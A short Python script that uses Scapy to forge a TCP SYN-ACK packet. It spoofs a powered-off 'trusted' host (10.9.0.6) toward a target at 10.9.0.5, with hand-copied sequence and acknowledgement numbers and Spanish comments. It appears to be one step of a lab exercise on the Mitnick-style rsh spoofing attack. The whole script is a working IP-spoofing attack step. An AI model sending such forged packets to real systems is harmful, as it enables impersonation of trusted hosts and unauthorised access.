#!/usr/bin/python3
from scapy.all import *

#La máquina src es la Trusted, que está apagada
ip = IP(src="10.9.0.6", dst="10.9.0.5")
#seq no importa (lo obtenemos del listing) pero ack lo obtenemos del mensaje SYN
tcp = TCP(sport=9090, dport=1023, flags="SA", seq=3920611526, ack=3977318558)

package_syn = ip/tcp
ls(package_syn)
send(package_syn,verbose=0)